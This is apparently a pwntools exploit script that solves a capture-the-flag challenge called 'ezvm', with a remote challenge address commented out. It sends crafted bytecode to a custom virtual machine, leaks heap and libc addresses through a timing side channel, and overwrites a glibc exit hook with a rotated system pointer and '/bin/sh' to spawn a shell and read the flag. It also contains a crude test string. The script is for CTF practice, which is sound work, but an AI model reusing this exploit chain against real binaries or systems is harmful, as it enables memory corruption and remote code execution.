from pwn import *
import time

TIMEOUT = 0.15

code = ""

ooo = 0x0
while True:
	r = process("./ezvm")
	# r = remote("47.252.3.1", 40241)
	r.sendline("a")

	def push_reg(r):
		return "\x00" + chr(r)

	def pop_reg(r):
		return "\x01" + chr(r)

	def add():
		return "\x02"

	def sub():
		return "\x03"

	def mul():
		return "\x04"

	def div():
		return "\x05"

	def mod():
		return "\x06"

	def lshift():
		return "\x07"

	def rshift():
		return "\x08"

	def bit_and():
		return "\x09"

	def bit_or():
		return "\x0b"

	def bit_xor():
		return "\x0c"

	def load_imm(r, v):
		return "\x14" + chr(r) + p64(v)

	def store(r, off):
		return "\x15" + chr(r) + p64(off)

	def load_reg(r, off):
		return "\x16" + chr(r) + p64(off)

	def branch_not_zero(branch_inc):
		return "\x0f" + p64(branch_inc)

	def send_code(c, mem_size, end=False):
		# r.recvuntil(":\n")
		r.sendline(str(len(c)))
		# r.recvuntil(":\n")
		r.sendline(str(mem_size))
		r.recvuntil("code:\n")
		r.send(c)
		if not end:
			r.sendline("a")
		else:
			r.sendline("bye bye")

	def create_leak_code(bit_n):
		c = ""
		c += load_reg(0, 0)
		c += push_reg(0)
		c += load_imm(1, bit_n)
		c += push_reg(1)
		c += rshift()
		c += load_imm(1, 1)
		c += push_reg(1)
		c += bit_and()

		c += branch_not_zero(28)
		c += load_imm(2, 0x10000000 / 32) # 10

		c += push_reg(2) # 2
		c += push_reg(1) # 2
		c += sub() # 1 
		c += pop_reg(2) # 2

		c += push_reg(2) # 2
		c += branch_not_zero(0x10000000000000000 - 9 - 9) # 9

		c += "\x17"
		return c

	def write(target, value):
		c = ""
		c += load_imm(0, value)
		c += store(0, (target - chunk) / 8)
		return c
	def read(target):
		c = ""
		c += load_reg(0, (target - chunk) / 8)
		return c

	code += "\x17"
	# send_code(code, (1 << 64) / 8)

	c = create_leak_code(0)

	send_code("\x17"*len(c), 0x30/8)
	leak = 0x0
	for i in range(64 - 8 - 8 - 13):
		start = time.time()
		send_code(create_leak_code(i), 0x30/8)
		r.recvuntil("finish!")
		end = time.time()
		if end - start < TIMEOUT:
			leak |= (1 << i)
		print("Took: {}".format(end - start))
	print(hex(leak))

	heap = leak << 12

	send_code("\x17"*len(c), 0x500/8)

	leak = 0x0
	for i in range(64 - 8 - 8 - 1):
		start = time.time()
		send_code(create_leak_code(i), 0x500/8)
		r.recvuntil("finish!")
		end = time.time()
		if end - start < TIMEOUT:
			leak |= (1 << i)
		print("Took: {}".format(end - start))
	print(hex(leak))

	libc_base = leak - 0x2198e0

	print("LIBC BASE", hex(libc_base))

	strlen_got = 0x0000000000219098 + libc_base
	chunk = heap + 0x550
	one_gadgets = [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8, 0xebd52, 0xebdaf, 0xebdb3]
	one_gadget = 0x50a37 + libc_base
	offset = strlen_got - chunk

	# target = libc_base + 0x239160 + 0x18
	target = libc_base + 0x22b160 + 0x18 + ooo

	print(hex(strlen_got), hex(chunk))
	print(hex(offset))

	ld_base = libc_base + 0x240000
	start_got = 0x2191b8 + libc_base
	end_got = 0x00000000002191C0 + libc_base
	stdout = 0x21a868 + libc_base
	environ = 0x221200 + libc_base

	tls_0x30_off = libc_base - 0x2890
	exit_hook = 0x21af00 + libc_base + 0x18

	system = libc_base + 0x50d60
	binsh = libc_base + 0x1d8698
	asdf = ((system << 17) | (system >> (64 - 17))) & 0xffffffffffffffff
	code = ""
	code += write(exit_hook, asdf)
	code += write(tls_0x30_off, 0x0)
	code += write(exit_hook + 0x8, binsh)
	code += "\x17"*(0x1ff-len(code))
	assert "\n" not in code
	# code += write(target, heap + 0x500)
	# code += write(heap + 0x500 + 0x28, heap + 0x500)
	# code += write(heap + 0x500 + 0x48, heap + 0x500 + 0x58)
	# code += write(heap + 0x500 + 0x50, 0x8)
	# code += write(heap + 0x500 + 0x58, one_gadget)
	# # code += write(heap + 0x500 + 0x58, 0x414141414141)
	# code += write(heap + 0x500 + 0x110, heap + 0x500 + 0x40)
	# code += write(heap + 0x500 + 0x120, heap + 0x500 + 0x48)
	# code += write(heap + 0x500 + 0x318, 0x9 << 32)

	send_code(code, (1 << 64) / 8, end=True)

	r.sendline("echo PENIS")
	a = ""
	try:
		a = r.recvuntil("PENIS", timeout=2)
	except:
		pass
	if "PENIS" in a:
		print("WIN")
		print(ooo)
		r.sendline("cat flag")
		r.interactive()

	ooo += 0x1000
	if ooo == 0x51000: ooo = -0x50000
	r.close()
